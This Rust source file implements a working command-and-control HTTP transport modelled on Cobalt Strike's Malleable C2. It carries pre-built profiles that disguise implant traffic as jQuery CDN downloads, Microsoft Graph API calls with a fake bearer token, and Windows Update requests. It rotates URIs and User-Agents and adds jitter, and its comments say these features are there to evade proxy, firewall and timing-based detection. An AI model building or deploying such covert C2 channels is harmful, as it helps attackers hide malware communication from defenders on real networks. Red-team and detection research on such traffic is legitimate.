//! CS Malleable C2 profiles — HTTP detail customization to mimic legitimate apps.
//!
//! Cobalt Strike's Malleable C2 system lets operators customize every HTTP
//! detail — method, URI, headers, User-Agent — to evade signature-based
//! detection at edge proxies and NGFWs. This module provides the same
//! capability: configurable profiles with URI/UA pool rotation, custom
//! header injection, and per-request jitter, all wrapped behind the
//! pluggable [`Transport`] trait.
//!
//! ## Pre-built profiles
//!
//! | Profile          | Method | Spoofs                        |
//! |------------------|--------|-------------------------------|
//! | `jquery_cdn`     | GET    | jQuery CDN (cdnjs, jsDelivr)  |
//! | `o365_api`       | POST   | Microsoft Graph / O365 API    |
//! | `windows_update` | GET    | Windows Update / WSUS         |
//!
//! ## Protocol
//!
//! - **send**: Base64-encode the frame, pick URI+UA from rotating pools, issue
//!   the configured HTTP method with custom headers and optional ±jitter delay.
//! - **recv**: Poll a URI from the pool, decode Base64 response body. Empty
//!   responses are treated as "no data yet" and re-polled until `timeout_ms`.
//! - **health_check**: GET the first URI; measure round-trip latency. 5 s
//!   hard timeout so a dead server doesn't block the health scan.

use std::time::{Duration, Instant};

use base64::Engine as _;
use rand::Rng;

use crate::traits::{Transport, TransportError};

// ---- Constants -------------------------------------------------------------

/// Maximum frame payload (1 MB).
const MAX_FRAME: usize = 1024 * 1024;

/// Base jitter delay in milliseconds. The actual delay is `base ± jitter_pct%`.
const JITTER_BASE_MS: u64 = 100;

/// Poll interval for recv when no data is available.
const POLL_INTERVAL_MS: u64 = 500;

/// Hard timeout for health-check requests.
const HEALTH_TIMEOUT_S: u64 = 5;

// ---- MalleableProfile ------------------------------------------------------

/// A CS-compatible Malleable C2 profile.
///
/// Every field can be customised; the three constructor helpers
/// (`jquery_cdn`, `o365_api`, `windows_update`) ship battle-tested defaults.
#[derive(Debug, Clone)]
pub struct MalleableProfile {
    /// HTTP method: `"GET"`, `"POST"`, `"PUT"`, `"PATCH"`, `"DELETE"`.
    /// Case-insensitive; anything not recognised defaults to GET.
    pub http_method: String,

    /// URI pool — rotated round-robin on every request.
    pub uris: Vec<String>,

    /// User-Agent pool — rotated round-robin alongside URIs.
    pub user_agents: Vec<String>,

    /// Extra headers injected into every request (e.g. `Accept`, `Cookie`).
    /// `User-Agent` is set separately from the pool; do not duplicate it here.
    pub headers: Vec<(String, String)>,

    /// Jitter percentage (0–100).  Each request sleeps `JITTER_BASE_MS` ± this
    /// percentage before sending.  0 disables jitter entirely.
    pub jitter_pct: u8,
}

// ---- MalleableTransport ----------------------------------------------------

/// CS Malleable C2 HTTP transport channel.
///
/// Wraps a [`MalleableProfile`] and a blocking `reqwest` client.  Every
/// outbound frame is Base64-encoded and sent as the request body; inbound
/// frames are decoded from the response body.
pub struct MalleableTransport {
    profile: MalleableProfile,
    base_url: String,
    agent: reqwest::blocking::Client,
    uri_idx: usize,
    ua_idx: usize,
}

impl MalleableTransport {
    // -- constructors --------------------------------------------------------

    /// Create a transport from a raw profile.
    ///
    /// Builds a blocking `reqwest` client with a 30s timeout. The server runs
    /// under `panic = "abort"`, so a client-build failure (e.g. a TLS backend
    /// misconfiguration) must NOT panic the process — instead we log and fall
    /// back to `Client::new()`, which uses system defaults and is documented to
    /// always succeed. The transport then degrades to default behaviour rather
    /// than aborting.
    pub fn new(base_url: String, profile: MalleableProfile) -> Self {
        let agent = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .unwrap_or_else(|e| {
                tracing::error!("malleable reqwest build failed: {e}, using default");
                reqwest::blocking::Client::new()
            });
        Self {
            profile,
            base_url,
            agent,
            uri_idx: 0,
            ua_idx: 0,
        }
    }

    // -- pre-built profiles --------------------------------------------------

    /// jQuery CDN profile — mimics a browser fetching jquery.min.js.
    ///
    /// GET requests with `Accept: */*` and common CDN User-Agents.
    pub fn jquery_cdn(base_url: String) -> Self {
        let profile = MalleableProfile {
            http_method: "GET".into(),
            uris: vec![
                "/jquery-3.7.1.min.js".into(),
                "/jquery-3.6.4.min.js".into(),
                "/ajax/libs/jquery/3.7.1/jquery.min.js".into(),
                "/jquery.min.js".into(),
            ],
            user_agents: vec![
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36".into(),
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36".into(),
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36".into(),
            ],
            headers: vec![
                ("Accept".into(), "*/*".into()),
                ("Accept-Language".into(), "en-US,en;q=0.9".into()),
                ("Cache-Control".into(), "no-cache".into()),
            ],
            jitter_pct: 20,
        };
        Self::new(base_url, profile)
    }

    /// Office 365 API profile — mimics Microsoft Graph REST calls.
    ///
    /// POST requests with `Authorization: Bearer <fake>`, JSON content type,
    /// and Microsoft Office User-Agent strings.
    pub fn o365_api(base_url: String) -> Self {
        let profile = MalleableProfile {
            http_method: "POST".into(),
            uris: vec![
                "/v1.0/me/messages".into(),
                "/v1.0/me/events".into(),
                "/v1.0/me/contacts".into(),
                "/v2.0/me/drive/root/children".into(),
            ],
            user_agents: vec![
                "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)".into(),
                "Microsoft Office Excel/16.0.16327 (Windows NT 10.0)".into(),
            ],
            headers: vec![
                ("Authorization".into(), "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9mYWtlLXRlbmFudCIsImlhdCI6MTcwMDAwMDAwMCwibmJmIjoxNzAwMDAwMDAwLCJleHAiOjE4MDAwMDAwMDAsInN1YiI6ImZha2UtdXNlciJ9.fake-signature".into()),
                ("Content-Type".into(), "application/json; charset=utf-8".into()),
                ("Accept".into(), "application/json".into()),
                ("X-Client-Version".into(), "16.0.16327.20264".into()),
            ],
            jitter_pct: 10,
        };
        Self::new(base_url, profile)
    }

    /// Windows Update profile — mimics a Windows host fetching updates.
    ///
    /// GET requests with `Windows-Update-Agent` User-Agent and WSUS-style
    /// headers.
    pub fn windows_update(base_url: String) -> Self {
        let profile = MalleableProfile {
            http_method: "GET".into(),
            uris: vec![
                "/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab".into(),
                "/c/msdownload/update/software/secu/2024/06/windows10.0-kb5039211-x64.cab".into(),
                "/c/msdownload/update/others/2024/06/5039211.cab".into(),
                "/msdownload/update/v3-19990518/cabpool/windows10.0-kb5039211-x64-ndp48_1234567890abc.cab".into(),
            ],
            user_agents: vec![
                "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.40".into(),
                "Windows-Update-Agent/10.0.10011.16401".into(),
            ],
            headers: vec![
                ("Accept".into(), "*/*".into()),
                ("Accept-Encoding".into(), "identity".into()),
                ("Cache-Control".into(), "no-cache".into()),
                ("Pragma".into(), "no-cache".into()),
                ("Connection".into(), "Keep-Alive".into()),
            ],
            jitter_pct: 15,
        };
        Self::new(base_url, profile)
    }

    // -- internal helpers ----------------------------------------------------

    /// Round-robin the URI pool.
    fn next_uri(&mut self) -> &str {
        let uri = &self.profile.uris[self.uri_idx % self.profile.uris.len()];
        self.uri_idx = self.uri_idx.wrapping_add(1);
        uri
    }

    /// Round-robin the User-Agent pool.
    fn next_ua(&mut self) -> &str {
        let ua = &self.profile.user_agents[self.ua_idx % self.profile.user_agents.len()];
        self.ua_idx = self.ua_idx.wrapping_add(1);
        ua
    }

    /// Compute a random jitter delay: `JITTER_BASE_MS ± jitter_pct%`.
    ///
    /// Returns 0 when `jitter_pct` is 0.
    fn jitter_ms(&self) -> u64 {
        if self.profile.jitter_pct == 0 {
            return 0;
        }
        let base = JITTER_BASE_MS as i64;
        let range = (base * self.profile.jitter_pct as i64) / 100;
        let mut rng = rand::thread_rng();
        let offset: i64 = rng.gen_range(-range..=range);
        (base + offset).max(0) as u64
    }

    /// Build an HTTP request with the configured method, URI, User-Agent, and
    /// custom headers.
    fn build_request(&mut self, path: &str) -> reqwest::blocking::RequestBuilder {
        let url = format!("{}{}", self.base_url, path);
        let ua = self.next_ua().to_string();
        let mut req = match self.profile.http_method.to_uppercase().as_str() {
            "POST" => self.agent.post(&url),
            "PUT" => self.agent.put(&url),
            "PATCH" => self.agent.patch(&url),
            "DELETE" => self.agent.delete(&url),
            _ => self.agent.get(&url),
        };
        req = req.header("User-Agent", ua);
        for (k, v) in &self.profile.headers {
            req = req.header(k.as_str(), v.as_str());
        }
        req
    }
}

// ---- Transport impl --------------------------------------------------------

impl Transport for MalleableTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > MAX_FRAME {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        // Jitter before send — randomise timing to evade cadence detection.
        let jitter = self.jitter_ms();
        if jitter > 0 {
            std::thread::sleep(Duration::from_millis(jitter));
        }

        let text = base64::engine::general_purpose::STANDARD.encode(frame);
        let uri = self.next_uri().to_string();

        let resp = self.build_request(&uri).body(text).send().map_err(|e| {
            if e.is_timeout() {
                TransportError::Timeout
            } else {
                TransportError::Transient("malleable send failed")
            }
        })?;

        if resp.status().is_server_error() {
            return Err(TransportError::Transient("malleable send: server error"));
        }
        Ok(())
    }

    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        let deadline = Instant::now() + Duration::from_millis(timeout_ms as u64);
        let poll = Duration::from_millis(POLL_INTERVAL_MS);

        loop {
            let uri = self.next_uri().to_string();

            match self.build_request(&uri).send() {
                Ok(resp) if resp.status().is_success() => {
                    let body = resp.text().map_err(|_| {
                        TransportError::Transient("malleable recv: body decode error")
                    })?;

                    if !body.is_empty() {
                        return base64::engine::general_purpose::STANDARD
                            .decode(body.trim())
                            .map_err(|_| {
                                TransportError::Transient("malleable recv: base64 decode error")
                            });
                    }
                    // Empty body → no data yet, keep polling.
                }
                Ok(_) => {
                    // Non-2xx status → keep polling.
                }
                Err(e) => {
                    if !e.is_timeout() {
                        return Err(TransportError::Transient("malleable recv failed"));
                    }
                    // Timeout → keep polling.
                }
            }

            if Instant::now() >= deadline {
                return Err(TransportError::Timeout);
            }
            std::thread::sleep(poll);
        }
    }

    fn health_check(&self) -> Option<u64> {
        let uri = self.profile.uris.first()?;
        let url = format!("{}{}", self.base_url, uri);
        let start = Instant::now();

        let resp = self
            .agent
            .get(&url)
            .timeout(Duration::from_secs(HEALTH_TIMEOUT_S))
            .send();

        match resp {
            Ok(_) => Some(start.elapsed().as_millis() as u64),
            Err(_) => None,
        }
    }

    fn name(&self) -> &'static str {
        "malleable"
    }

    fn max_frame_size(&self) -> usize {
        MAX_FRAME
    }

    fn requires_probe(&self) -> bool {
        false
    }
}

// ---- Tests -----------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn jquery_cdn_profile_constructs() {
        let t = MalleableTransport::jquery_cdn("https://cdn.example.com".into());
        assert_eq!(t.profile.http_method, "GET");
        assert_eq!(t.profile.uris.len(), 4);
        assert_eq!(t.profile.user_agents.len(), 3);
        assert_eq!(t.profile.headers.len(), 3);
        assert_eq!(t.profile.jitter_pct, 20);
        assert_eq!(t.name(), "malleable");
        assert!(!t.profile.uris.first().unwrap().is_empty());
    }

    #[test]
    fn o365_api_profile_constructs() {
        let t = MalleableTransport::o365_api("https://graph.example.com".into());
        assert_eq!(t.profile.http_method, "POST");
        assert_eq!(t.profile.uris.len(), 4);
        assert_eq!(t.profile.user_agents.len(), 2);
        assert!(t.profile.headers.iter().any(|(k, _)| k == "Authorization"));
        assert_eq!(t.profile.jitter_pct, 10);
    }

    #[test]
    fn windows_update_profile_constructs() {
        let t = MalleableTransport::windows_update("https://update.example.com".into());
        assert_eq!(t.profile.http_method, "GET");
        assert_eq!(t.profile.uris.len(), 4);
        assert_eq!(t.profile.user_agents.len(), 2);
        assert!(t.profile.headers.iter().any(|(k, _)| k == "Pragma"));
        assert_eq!(t.profile.jitter_pct, 15);
    }

    #[test]
    fn uri_rotation_round_robins() {
        let profile = MalleableProfile {
            http_method: "GET".into(),
            uris: vec!["/a".into(), "/b".into(), "/c".into()],
            user_agents: vec!["ua1".into()],
            headers: vec![],
            jitter_pct: 0,
        };
        let mut t = MalleableTransport::new("http://x".into(), profile);

        assert_eq!(t.next_uri(), "/a");
        assert_eq!(t.next_uri(), "/b");
        assert_eq!(t.next_uri(), "/c");
        assert_eq!(t.next_uri(), "/a"); // wraps
    }

    #[test]
    fn ua_rotation_round_robins() {
        let profile = MalleableProfile {
            http_method: "GET".into(),
            uris: vec!["/a".into()],
            user_agents: vec!["ua1".into(), "ua2".into()],
            headers: vec![],
            jitter_pct: 0,
        };
        let mut t = MalleableTransport::new("http://x".into(), profile);

        assert_eq!(t.next_ua(), "ua1");
        assert_eq!(t.next_ua(), "ua2");
        assert_eq!(t.next_ua(), "ua1"); // wraps
    }

    #[test]
    fn jitter_zero_is_zero() {
        let profile = MalleableProfile {
            http_method: "GET".into(),
            uris: vec!["/".into()],
            user_agents: vec!["x".into()],
            headers: vec![],
            jitter_pct: 0,
        };
        let t = MalleableTransport::new("http://x".into(), profile);
        assert_eq!(t.jitter_ms(), 0);
    }

    #[test]
    fn jitter_stays_within_range() {
        let profile = MalleableProfile {
            http_method: "GET".into(),
            uris: vec!["/".into()],
            user_agents: vec!["x".into()],
            headers: vec![],
            jitter_pct: 20, // base 100ms ± 20% → 80..120ms
        };
        let t = MalleableTransport::new("http://x".into(), profile);
        for _ in 0..100 {
            let j = t.jitter_ms();
            assert!(j >= 80, "jitter {} too low", j);
            assert!(j <= 120, "jitter {} too high", j);
        }
    }

    #[test]
    fn payload_too_large_rejected() {
        let mut t = MalleableTransport::jquery_cdn("http://x".into());
        let big = vec![0u8; MAX_FRAME + 1];
        let err = t.send(&big).unwrap_err();
        match err {
            TransportError::PayloadTooLarge(n) => assert_eq!(n, MAX_FRAME + 1),
            _ => panic!("expected PayloadTooLarge, got {:?}", err),
        }
    }

    #[test]
    fn health_check_times_out_on_dead_host() {
        // Use a non-routable IP that will never respond.
        let profile = MalleableProfile {
            http_method: "GET".into(),
            uris: vec!["/".into()],
            user_agents: vec!["x".into()],
            headers: vec![],
            jitter_pct: 0,
        };
        let t = MalleableTransport::new("http://192.0.2.1".into(), profile);
        // Should return None within the 5 s hard timeout (plus connection
        // overhead), not hang indefinitely.
        let start = Instant::now();
        let result = t.health_check();
        let elapsed = start.elapsed();
        assert!(result.is_none(), "expected None on dead host");
        assert!(
            elapsed < Duration::from_secs(HEALTH_TIMEOUT_S + 2),
            "health check took {:?}, should be bounded by {HEALTH_TIMEOUT_S}s",
            elapsed
        );
    }

    #[test]
    fn max_frame_size_is_one_mb() {
        let t = MalleableTransport::jquery_cdn("http://x".into());
        assert_eq!(t.max_frame_size(), 1024 * 1024);
    }

    #[test]
    fn requires_probe_is_false() {
        let t = MalleableTransport::jquery_cdn("http://x".into());
        assert!(!t.requires_probe());
    }

    #[test]
    fn custom_method_mapping() {
        // Unknown/custom methods default to GET.
        for method in &[
            "GET", "get", "POST", "post", "PUT", "put", "DELETE", "delete", "PATCH", "patch",
            "HEAD", "head",
        ] {
            let profile = MalleableProfile {
                http_method: method.to_string(),
                uris: vec!["/x".into()],
                user_agents: vec!["ua".into()],
                headers: vec![],
                jitter_pct: 0,
            };
            let _t = MalleableTransport::new("http://x".into(), profile);
            // No panic → mapping handled.
        }
    }
}
